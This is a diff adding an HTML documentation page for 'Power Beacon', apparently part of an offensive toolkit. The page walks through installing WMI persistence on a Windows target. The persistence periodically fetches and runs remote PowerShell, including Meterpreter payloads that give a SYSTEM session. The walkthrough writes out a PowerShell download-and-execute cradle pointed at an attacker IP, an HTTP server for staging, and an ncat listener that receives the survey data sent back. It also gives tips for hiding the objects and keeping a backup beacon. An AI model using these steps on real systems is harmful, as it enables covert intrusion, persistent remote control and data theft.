@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <script src="css/jquery.min.js"></script>
+  <script src="css/bootstrap.min.js"></script>
+  <title>DragonFire</title>
+</head>
+<body>
+
+<!-- begin nav bar !-->  
+ <nav class="navbar navbar-inverse navbar-fixed-top">
+  <div class="container-fluid">
+    <div class="navbar-header">
+	<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>                        
+      </button>
+      <a class="navbar-brand" href="index.html">DragonFire</a>
+    </div>
+	<div class="collapse navbar-collapse" id="myNavbar">
+    <ul class="nav navbar-nav">
+      <li><a href="windows.html">Windows</a></li>
+      <li><a href="linux.html">Linux</a></li>
+	  <li><a href="other.html">Other Devices</a></li>
+	  <li><a href="misc.html">Misc</a></li>
+    </ul>
+	<ul class="nav navbar-nav navbar-right">
+	</ul>
+	</div>
+  </div>
+</nav>
+<!-- end nav bar !-->  
+
+<!-- begin breadcrumb !-->  
+<div class="container" style="margin-top:50px">
+  <div class="row">
+    <div class="col-md-12">
+
+<nav aria-label="breadcrumb" role="navigation">
+  <ol class="breadcrumb">
+    <li class="breadcrumb-item"><a href="index.html">Home</a></li>
+    <li class="breadcrumb-item"><a href="windows.html">Windows</a></li>
+    <li class="breadcrumb-item active" aria-current="page">Power Beacon</li>
+  </ol>
+</nav>
+
+</div>
+</div>
+</div>	
+<!-- end breadcrumb !-->  
+
+  
+<!-- begin page contents !-->
+<div class="container">
+  <h3>Power Beacon</h3>
+  <div class="row">
+    <div class="col-md-8">
+      
+	  <p>Power Beacon uses WMI-Objects to create a persistent 'beacon' on a set timer.</p>
+	  
+	  <h4>Table of Contents</h4>
+	  <p>Walkthrough
+	  <p>Video Demo  
+	  <p>Technical Details  
+	  
+    </div>	  
+    <!-- begin information box !-->  
+	<div class="col-md-4">
+		<div class="panel-group">
+         <div class="panel panel-info">
+	        <div class="panel-heading">Information</div>
+				<div class="panel-body">
+					<p>Work With: Windows
+					<br>Requires: Powershell v2+, an elevated shell</br>
+				</div>
+		</div>
+     
+		</div>
+    </div>
+   </div>
+   <!-- end information box !-->  
+</div>
+
+<!-- begin main body !-->  
+<div class="container">
+  <div class="row">
+    <div class="col-md-12">
+    <h3>Power Beacon</h3>    
+    Use the script located at <code>/dragonfire/bin/power_beacon/power_beacon.sh</code> (alias=powerbeacon) to generate the powershell script used to install the WMI-Object, as well as an uninstall script.  
+	Once the script is created, either run the commands directly in an administrative powershell window, or (more likely) use powershell to download and run the script into memory.
+    <br><br>Power Beacon creates a WMI-Object that queries the current time every 10 seconds.  If any time in the last 10 seconds matches the trigger time, the beacon is executed.  
+    <br>Upon execution, power beacon will call out to a pre-defined web address	and consume whatever powershell script is located there.  This can be anything from a meterpreter payload
+	to a list of commands to run.  Included is a payload template that will run a series of situational awareness checks and return the results to a netcat listener.  
+	
+	
+	
+    <div class="alert alert-warning" role="alert">
+    <p>You must use be running from an elevated process to install WMI-Objects</p>
+    </div>	
+	
+
+	<p><br><h4>Walkthrough</h4>
+	Run <code>/dragonfire/bin/power_beacon/power_beacon.sh</code>
+	<br>You will need to provide some information to the script.
+	<br>1.  The address:port/filename for the beacon payload.  This will where power beacon will call to request its payloads.
+    <br>2.  The name of the 'Filter.'  This is the name for the WMI-Object that will watch for process creation.  You can use ANY name, but use something smart.  This will be visible to an administrator who knows how to find it.
+	<br>3.  The name of the 'Consumer.'  This WMI-Object will hold the command to kill the process.  Just like the 'Filter' it can be anything.
+	<br>4.  An output file.  This is local.
+	<br>5.  A beacon interval.  
+	<br><br>Afterwords, you'll see the options again, press enter to create.
+	<br>The script will create TWO files.  The first (file_name) contains the powershell script to build the WMI-Objects.  The second (file_name_remove) will delete the WMI-Objects, removing the effect.
+		<p><img class="img-responsive" src="images/power_beacon_walk1.jpg"></img>
+    <br><br>Now we just need to execute this on our target system.
+	<br><br>Start your python httpserver in the folder with your files.
+	<br><code>python -m SimpleHTTPServer 8080</code>
+    <br>From an elevated command prompt, run your powershell pickup line.
+    <br><code>powershell -c iex(New-Object Net.WebClient).DownloadString('http://192.168.142.134:8080/here')</code>
+    <br><br>To undo, just call the removal script instead.	
+    <br><code>powershell -c iex(New-Object Net.WebClient).DownloadString('http://192.168.142.134:8080/here_remove')</code>  
+	<br><br>Now that the beacon is installed it will reach out to the web location you chose on it's interval and attempt to execute whatever powershell is there.  If there is nothing listening nothing bad happens.  Power
+    beacon will wait until its next cycle and call again.	
+	<div class="alert alert-info" role="alert">
+        <p>If you lose the removal file you can create another by re-running power beacon with the same input.</p>
+    </div>	
+
+	
+	
+	
+	
+	<p><br><h4>Use Power Beacon to Run Commands & Return Results</h4>
+    There is a template file located at <code>/dragonfire/bin/power_beacon/survey_template</code> that can be used to execute commands and return their results.  Make a copy of the template file
+    and edit it as needed.  The commands will be running in powershell, so escape sequesnces and things are different.  The template has some good examples, but if you
+	are trying anything strange be sure to test it first.   The results are returned via a powershell tcp socket and can be captured by a netcat listener.
+	<br>Use <code>ncat -klvp [PORT] | tee [outputfile.txt]</code> to start ncat listening persistently and show output on screen as well as saved to a file.  Installation and usage demos are below.
+	
+	
+	
+	<p><br><h4>Installation Demo</h4>
+	This video shows the steps to install the power beacon WMI objects.  At the end of the video, power beacon is installed and beaconing.  For usage, see the second video.
+
+<div class="embed-responsive embed-responsive-16by9"> 
+    <video width="320" height="240" controls>
+        <source src="media/power_beacon_install.mp4" type="video/mp4">
+    </video>
+</div> 
+
+	<p><br><h4>Remote Survey Demo</h4>
+	This video is using the installed power beacon from video one to pick up a survey script and return the results to our netcat listener.
+
+<div class="embed-responsive embed-responsive-16by9"> 
+    <video width="320" height="240" controls>
+        <source src="media/power_beacon_survey.mp4" type="video/mp4">
+    </video>
+</div> 
+
+
+	<p><br><h4>Get Up with Meterpreter</h4>
+	This video is using the installed power beacon from video one to pick up a meterpreter powershell payload, giving us a SYSTEM level meterpreter session.
+
+<div class="embed-responsive embed-responsive-16by9"> 
+    <video width="320" height="240" controls>
+        <source src="media/power_beacon_meterpreter.mp4" type="video/mp4">
+    </video>
+</div> 
+
+
+
+	<p><br><h4>Technical Details</h4>
+    The technical details are the same (for the most part) as the tech details for <a href="process_disabler.html">process_disabler</a> except this time we are filtering on and InstanceModificationEvent to Win32_LocalTime.
+	When the time changes the filter checks to see if the time matches our filter, and if so, the consumer triggers.
+	
+    <p><br><h4>Can I Change the Beacon Interval?</h4>
+	No.  The beacon interval is set when you install the WMI-Object.  However, let's assume you have your beacon set for 1 hour, but you want it to lower to 1 minute.  Don't worry, create a second
+	installer (making sure to use diffent filter and consumer name) configured for 1 minute.  Then use your 1 hour beaconer to pick up the 1 minute installer.  Now you have two beaconers installed.  You can either 
+	uninstall the 1 hour one now, or leave it as a failsafe.
+
+	
+	
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+
+
+
+
+
+	</div><!-- end of 'row' tag !-->
+	</div><!-- end of main body!-->
+	
+	
+	
+
+	
+</body>
+</html>
